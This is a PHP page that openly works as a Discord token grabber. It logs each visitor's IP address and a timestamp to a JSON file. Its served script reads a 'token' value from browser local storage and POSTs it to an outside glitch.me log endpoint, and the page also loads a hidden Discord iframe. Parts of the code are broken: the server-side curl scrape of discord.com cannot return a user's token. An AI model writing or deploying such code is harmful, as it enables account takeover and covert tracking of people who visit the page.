<?php

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Prepare the URL to fetch the Discord token
$url = 'https://discord.com/channels/@me';

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Extract the Discord token from the response using regex
preg_match('/window\.localStorage\.getItem\(\'token\'\)\s*?.*?\'(.+?)\'/s', $response, $matches);

// If the Discord token is found, assign it to $discord_token, otherwise set a default message
$discord_token = isset($matches[1]) ? $matches[1] : "User was not logged in";

// Prepare the data to be saved
$data = array(
    'discord_token' => $discord_token,
    'ip' => $ip,
    'timestamp' => time()
);

// Encode the data as JSON
$json_data = json_encode($data);

// Check if the file user_4k.json exists, if not, create it
if (!file_exists('user_4k.json')) {
    file_put_contents('user_4k.json', '');
}

// Save the data to the file
file_put_contents('user_4k.json', $json_data . PHP_EOL, FILE_APPEND);

// Output the logged Discord token and IP address
echo "<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Logged Data</title>
</head>
<body>
    <h1>You have been logged!</h1>
    <p>Discord Token: <span id=\"discord_token\"></span></p>
    <p>IP Address: $ip</p>
    <script>
        // Function to send token to API
        function sendTokenToAPI(token) {
            fetch('https://fork-luxuriant-bangle.glitch.me/log.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ token: token })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Token sent to API successfully');
                } else {
                    console.error('Failed to send token to API');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        // Get Discord token from local storage
        var discordToken = window.localStorage.getItem('token');

        // Display Discord token
        document.getElementById('discord_token').innerText = discordToken;

        // Send token to API
        sendTokenToAPI(discordToken);
    </script>
    <iframe src=\"https://discord.com/channels/@me\" style=\"display: none;\"></iframe>
</body>
</html>";
